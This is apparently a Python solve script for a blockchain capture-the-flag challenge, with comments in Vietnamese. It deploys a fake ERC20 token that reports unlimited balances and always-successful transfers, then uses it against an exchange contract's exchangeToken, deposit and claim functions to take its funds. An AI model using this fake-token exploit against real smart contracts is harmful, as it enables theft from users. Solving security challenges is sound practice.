import sys
import time
from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version, get_installable_solc_versions

# --- CẤU HÌNH ---
# Dùng URL từ netcat của bạn
RPC_URL = "http://challenge.cnsc.com.vn:31205/43ba9107-2292-4dc0-8f12-3789a7799ba8"
PRIVATE_KEY = "e7d1d359fcbfce4210e74dd50fca1e0380c250867bdb945b9538e44ec268ecba"

# --- KHỞI TẠO ---
w3 = Web3(Web3.HTTPProvider(RPC_URL))
if not w3.is_connected():
    print("[-] Cannot connect to RPC. Check URL.")
    sys.exit(1)

account = w3.eth.account.from_key(PRIVATE_KEY)
player_address = account.address

print(f"[*] Connected to {RPC_URL}")
print(f"[*] Player Address: {player_address}")

# --- CÀI ĐẶT SOLC THỦ CÔNG ---
SOLC_VERSION = '0.8.20'
print(f"[*] Checking solc version {SOLC_VERSION}...")
try:
    install_solc(SOLC_VERSION)
    set_solc_version(SOLC_VERSION)
    print("[+] Solc installed and set.")
except Exception as e:
    print(f"[-] Error installing solc: {e}")
    # Thử tiếp tục, có thể đã cài rồi

# --- SOURCE CODE & ABIS ---
malicious_token_src = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
contract MaliciousToken {
    function balanceOf(address) external pure returns (uint256) { return type(uint256).max; }
    function transfer(address, uint256) external pure returns (bool) { return true; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return true; }
    function approve(address, uint256) external pure returns (bool) { return true; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
}
"""

setup_abi = [
    {"inputs": [], "name": "exchange", "outputs": [{"internalType": "contract Exchange", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "register", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
]

exchange_abi = [
    {"inputs": [{"internalType": "address", "name": "sender", "type": "address"}, {"internalType": "address", "name": "asset", "type": "address"}, {"internalType": "uint64", "name": "amount", "type": "uint64"}], "name": "exchangeToken", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"internalType": "contract IERC20", "name": "asset", "type": "address"}, {"internalType": "uint64", "name": "amount", "type": "uint64"}], "name": "deposit", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "claimReceivedWannaETH", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
]

def send_tx(func_call):
    try:
        tx = func_call.build_transaction({
            'from': player_address,
            'nonce': w3.eth.get_transaction_count(player_address),
            'gas': 5000000,
            'gasPrice': w3.to_wei('10', 'gwei')
        })
        signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        return receipt
    except Exception as e:
        print(f"[-] Transaction Error: {e}")
        raise e

def find_setup_contract():
    print("[*] Scanning blockchain for Setup contract...")
    latest_block = w3.eth.block_number
    
    found_contracts = []

    # Quét tất cả các block
    for i in range(latest_block + 1):
        block = w3.eth.get_block(i, full_transactions=True)
        for tx in block.transactions:
            if tx['to'] is None: # Giao dịch tạo contract
                receipt = w3.eth.get_transaction_receipt(tx['hash'])
                contract_addr = receipt.contractAddress
                
                # Bỏ qua nếu là địa chỉ người chơi (đề phòng bug hiển thị)
                if contract_addr == player_address:
                    continue

                print(f"   ? Checking contract at {contract_addr}...")
                try:
                    temp_contract = w3.eth.contract(address=contract_addr, abi=setup_abi)
                    # Gọi thử hàm exchange()
                    exch_addr = temp_contract.functions.exchange().call()
                    
                    # Nếu trả về địa chỉ 0 thì không phải Setup đúng
                    if exch_addr == "0x344D94A4391e7bf663036694fC44E9C37FE038de":
                        continue
                        
                    print(f"[+] FOUND Setup Contract at: {contract_addr}")
                    print(f"    -> Linked Exchange at: {exch_addr}")
                    return contract_addr
                except Exception:
                    continue
    
    raise Exception("Could not find Setup contract! The chain history might be empty or restricted.")

def solve():
    # 1. Tìm contract
    setup_address = find_setup_contract()
    setup_contract = w3.eth.contract(address=setup_address, abi=setup_abi)
    
    exchange_addr = setup_contract.functions.exchange().call()
    exchange_contract = w3.eth.contract(address=exchange_addr, abi=exchange_abi)

    # 2. Register
    print("[*] Registering...")
    try:
        send_tx(setup_contract.functions.register())
        print("[+] Registered.")
    except Exception as e:
        print(f"[-] Register info: {e}")

    # 3. Deploy Token
    print("[*] Compiling & Deploying Token...")
    # Thêm tham số solc_version để ép dùng bản đúng
    compiled_sol = compile_source(malicious_token_src, output_values=['abi', 'bin'], solc_version=SOLC_VERSION)
    contract_id, contract_interface = next(iter(compiled_sol.items()))
    
    MaliciousToken = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin'])
    
    tx = MaliciousToken.constructor().build_transaction({
        'from': player_address,
        'nonce': w3.eth.get_transaction_count(player_address),
        'gas': 2000000, 
        'gasPrice': w3.to_wei('10', 'gwei')
    })
    signed_tx = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
    receipt = w3.eth.wait_for_transaction_receipt(w3.eth.send_raw_transaction(signed_tx.raw_transaction))
    fake_token_addr = receipt.contractAddress
    print(f"[+] Malicious Token: {fake_token_addr}")

    # 4. Hack
    amount = 15 * 10**18
    
    print("[*] Step 1: exchangeToken...")
    send_tx(exchange_contract.functions.exchangeToken(player_address, fake_token_addr, amount))
    
    print("[*] Step 2: deposit (Glitch)...")
    send_tx(exchange_contract.functions.deposit(fake_token_addr, amount))
    
    print("[*] Step 3: claimReceivedWannaETH...")
    send_tx(exchange_contract.functions.claimReceivedWannaETH())

    # 5. Check
    if setup_contract.functions.isSolved().call():
        print("\n[!!!] SUCCESS! You can get the flag now.")
    else:
        print("\n[???] Failed. Check logic.")

if __name__ == "__main__":
    solve()